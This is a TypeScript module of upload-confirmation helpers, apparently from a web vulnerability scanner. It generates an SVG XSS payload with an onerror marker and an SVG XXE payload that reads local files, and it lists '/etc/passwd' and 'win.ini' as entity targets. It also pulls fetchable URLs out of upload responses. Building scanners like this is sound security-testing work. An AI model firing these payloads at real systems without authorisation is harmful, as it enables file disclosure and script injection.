// Upload confirmation helpers (v1): an accepted upload is NOT a finding. Confirm by fetching a URL the
// upload response gave us (or by in-band XXE in the upload body) and seeing SVG XSS / file contents.
// Webshell RCE is out of scope here.

const URL_KEYS = new Set([
  "url",
  "uri",
  "href",
  "src",
  "path",
  "location",
  "fileurl",
  "file_url",
  "downloadurl",
  "download_url",
  "publicurl",
  "public_url",
  "locationurl",
]);

export function controlSvg(): string {
  return `<svg xmlns="http://www.w3.org/2000/svg"><text>verdict-ctrl</text></svg>`;
}

/** Marker sits in an onerror attribute so record_finding's reflectionIsLive treats it as a live HTML position
 *  (a marker inside <script>…</script> is classified inert). */
export function xssSvg(marker: string): string {
  return `<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="${marker}"/></svg>`;
}

export function xxeSvg(entityUrl: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "${entityUrl}">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>`;
}

export const XXE_ENTITY_URLS: readonly string[] = Object.freeze(["file:///etc/passwd", "file:///c:/windows/win.ini"]);

/** Turn a response string into an absolute http(s) URL against `base` (the upload request URL). Bare filenames are skipped. */
export function coerceFetchUrl(raw: string, base: string): string | null {
  const t = raw.trim();
  if (!t || t.length > 2048) return null;
  if (/^(javascript|data|blob|about|file):/i.test(t)) return null;
  try {
    if (/^https?:\/\//i.test(t)) return new URL(t).href;
    if (t.startsWith("/")) return new URL(t, base).href;
  } catch {
    return null;
  }
  return null;
}

function collectJsonStrings(obj: unknown, key: string | undefined, out: string[], depth: number): void {
  if (depth > 4 || out.length > 12) return;
  if (typeof obj === "string") {
    if (key && URL_KEYS.has(key.toLowerCase())) out.push(obj);
    return;
  }
  if (Array.isArray(obj)) {
    for (const x of obj) collectJsonStrings(x, key, out, depth + 1);
    return;
  }
  if (obj && typeof obj === "object") {
    for (const [k, v] of Object.entries(obj as Record<string, unknown>)) {
      if (k === "__proto__" || k === "constructor" || k === "prototype") continue;
      collectJsonStrings(v, k, out, depth + 1);
    }
  }
}

/** URLs the upload response told us to fetch (Location, JSON url/path/href, HTML href/src). Deduped, unresolved filenames dropped. */
export function extractFetchUrls(body: string, headers: Record<string, string>, baseUrl: string): string[] {
  const raw: string[] = [];
  const loc = headers["location"] ?? headers["Location"] ?? "";
  if (loc) raw.push(loc);
  const trimmed = body.trim();
  if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
    try {
      collectJsonStrings(JSON.parse(trimmed) as unknown, undefined, raw, 0);
    } catch {
      /* not json */
    }
  }
  for (const m of body.matchAll(/\b(?:href|src)=["']([^"']+)["']/gi)) {
    if (m[1]) raw.push(m[1]);
  }
  const seen = new Set<string>();
  const out: string[] = [];
  for (const r of raw) {
    const abs = coerceFetchUrl(r, baseUrl);
    if (!abs || seen.has(abs)) continue;
    seen.add(abs);
    out.push(abs);
    if (out.length >= 8) break;
  }
  return out;
}
